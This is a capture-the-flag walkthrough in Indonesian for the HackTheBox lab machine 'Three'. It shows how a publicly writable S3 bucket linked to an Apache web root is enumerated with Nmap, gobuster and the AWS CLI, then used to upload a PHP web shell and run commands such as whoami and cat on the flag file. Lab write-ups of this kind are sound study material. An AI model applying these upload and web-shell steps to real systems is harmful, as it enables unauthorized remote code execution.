# HTB Three — S3 Bucket Misconfiguration → RCE

**Date:** 2026-05-14
**Platform:** HackTheBox (Starting Point Tier 2)
**Difficulty:** Very Easy
**Category:** Web / Cloud

---

## Target

Mesin Linux bernama "Three" yang menjalankan web app band musik bernama **The Toppers**.
Web app ini di-host menggunakan Apache dan file-filenya disimpan di S3 bucket yang terhubung langsung ke web root.
OS: Ubuntu, Web Server: Apache 2.4.29.

## Vulnerability

S3 bucket yang digunakan untuk menyimpan file web app dikonfigurasi dengan **public read dan write access** — siapapun bisa membaca isi bucket bahkan mengupload file tanpa autentikasi.
Karena bucket terhubung langsung ke web root Apache, file yang diupload ke bucket langsung bisa diakses via browser.
Kombinasi ini memungkinkan attacker mengupload file PHP berbahaya dan mengeksekusinya via URL untuk mendapatkan Remote Code Execution (RCE).

## Tools Used

- Nmap
- Gobuster
- AWS CLI (awscli)
- Browser (Firefox)

---

## Exploitation Steps

### Step 1 — Reconnaissance (Nmap Scan)

Scan port dan deteksi service yang berjalan di target.

```bash
nmap -sV -sC -T4 10.129.198.204
```

Hasil scan menunjukkan dua port terbuka:

| Port | Service | Version |
|------|---------|---------|
| 22   | SSH     | OpenSSH 7.6p1 Ubuntu |
| 80   | HTTP    | Apache httpd 2.4.29 |

HTTP dipilih sebagai target utama karena lebih banyak attack surface dibanding SSH yang butuh kredensial.

---

### Step 2 — Web Recon & Domain Discovery

Akses web app di browser dan temukan informasi domain dari halaman Contact.

```
http://10.129.198.204/#contact
```

Di halaman Contact ditemukan email: `mail@thetoppers.htb`
Domain yang digunakan: **thetoppers.htb**

Tambahkan domain ke file hosts lokal agar bisa di-resolve tanpa DNS server:

```bash
sudo nano /etc/hosts
```

Tambahkan baris:

```
10.129.198.204    thetoppers.htb
```

---

### Step 3 — Virtual Host Enumeration (Gobuster)

Enumerate subdomain/vhost yang mungkin tersembunyi menggunakan Gobuster mode vhost.

```bash
gobuster vhost -u http://thetoppers.htb \
  -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  --append-domain
```

Subdomain yang ditemukan: **s3.thetoppers.htb**

Tambahkan juga ke /etc/hosts:

```
10.129.198.204    thetoppers.htb s3.thetoppers.htb
```

Alternatif menggunakan ffuf dengan filter false positive:

```bash
ffuf -u http://thetoppers.htb \
  -H "Host: FUZZ.thetoppers.htb" \
  -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fs 11952
```

---

### Step 4 — S3 Bucket Enumeration (AWS CLI)

Konfigurasi AWS CLI dengan kredensial dummy karena bucket tidak memverifikasi autentikasi:

```bash
aws configure
# AWS Access Key ID: temp
# AWS Secret Access Key: temp
# Default region name: us-east-1
# Default output format: json
```

List semua bucket yang tersedia:

```bash
aws s3 ls --no-sign-request --endpoint-url http://s3.thetoppers.htb
```

List isi bucket thetoppers.htb:

```bash
aws s3 ls s3://thetoppers.htb \
  --no-sign-request \
  --endpoint-url http://s3.thetoppers.htb
```

Isi bucket:

```
PRE images/
    .htaccess
    index.php
```

Keberadaan `index.php` di bucket mengonfirmasi bahwa bucket ini terhubung langsung ke web root Apache di `thetoppers.htb`.

---

### Step 5 — Upload Web Shell

Buat file web shell PHP sederhana yang menerima parameter `cmd` dari URL,
lalu meneruskannya ke fungsi eksekusi sistem, dan simpan sebagai `shell.php`.

Upload web shell ke S3 bucket:

```bash
aws s3 cp shell.php s3://thetoppers.htb \
  --no-sign-request \
  --endpoint-url http://s3.thetoppers.htb
```

Output konfirmasi:

```
upload: ./shell.php to s3://thetoppers.htb/shell.php
```

---

### Step 6 — Remote Code Execution via Browser

Akses web shell melalui domain utama (bukan subdomain S3, karena hanya Apache yang bisa eksekusi PHP):

```
http://thetoppers.htb/shell.php?cmd=whoami
```

Output: `www-data` — konfirmasi RCE berhasil, command dieksekusi sebagai user Apache.

Cari lokasi file flag:

```
http://thetoppers.htb/shell.php?cmd=find / -name flag.txt
```

Output: `/var/www/flag.txt`

---

### Step 7 — Membaca Flag

```
http://thetoppers.htb/shell.php?cmd=cat /var/www/flag.txt
```

---

## Proof

```
Flag: a980d99281a28d638ac68b9bf9453c2b
```

---

## Lessons Learned

- Domain yang tertera di email (bagian setelah @) bisa langsung jadi domain target web app — selalu perhatikan info sekecil apapun di halaman web.
- Satu IP bisa hosting banyak virtual host tersembunyi — enumerate vhost adalah langkah recon yang wajib dilakukan setelah menemukan domain.
- S3 bucket yang misconfigured (public write access) dan terhubung ke web root adalah celah kritis — file apapun yang diupload langsung bisa dieksekusi server.
- Web shell harus diakses lewat domain utama yang diproses Apache, bukan lewat subdomain S3 yang hanya berfungsi sebagai storage.
- Flag `--no-sign-request` dan `--endpoint-url` wajib disertakan setiap kali berinteraksi dengan S3 lokal menggunakan AWS CLI — tanpanya, request nyasar ke Amazon S3 asli.
- `www-data` adalah user default Apache — jika `whoami` mengembalikan nilai ini, berarti RCE berhasil berjalan di konteks web server.
- Perbedaan web shell dan reverse shell: web shell lebih simpel tapi terbatas satu command per request, reverse shell memberikan akses interaktif penuh.